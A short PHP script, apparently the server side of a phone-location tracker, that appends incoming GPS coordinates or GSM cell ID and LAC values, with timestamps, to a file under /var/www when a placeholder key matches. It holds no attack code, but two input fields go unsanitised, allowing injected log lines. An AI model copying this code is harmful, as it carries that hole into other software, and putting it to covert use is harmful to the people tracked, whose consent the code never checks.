<?php

  // Remember to change all UPDATE_TO_YOURS

        date_default_timezone_set("America/New_York");

        if( isset($_POST['lat']) && isset($_POST['lon']) && $_POST['key'] == 'UPDATE_TO_YOURS') // Whatever made up, unique key you want here
        {
                $latReceive = $_POST['lat'];
                $lonReceive = $_POST['lon'];
                $lonReceive = str_replace(array("\r\n", "\n", "\r"), '', $lonReceive);
                $dateNow = date("m-d-Y - h:i:sa");

                $received = ("lat: $latReceive, lng: $lonReceive, $dateNow\n");
                $filename = "/var/www/results";
                $fh = fopen($filename, "a");
                fwrite($fh, $received);
                fclose($fh);
        }

        if( isset($_POST['cellid']) && isset($_POST['lac']) && $_POST['key'] == 'UPDATE_TO_YOURS') // Whatever made up, unique key you want here
        {
                $cellidReceive = $_POST['cellid'];
                $lacReceive = $_POST['lac'];
                $lacReceive = str_replace(array("\r\n", "\n", "\r"), '', $lacReceive);
                $dateNow = date("m-d-Y - h:i:sa");

                $gsmReceived = ("CellID: $cellidReceive, LAC: $lacReceive, $dateNow\n");
                $gsmFilename = "/var/www/results";
                $gsmfh = fopen($gsmFilename, "a");
                fwrite($gsmfh, $gsmReceived);
                fclose($gsmfh);
        }

?>
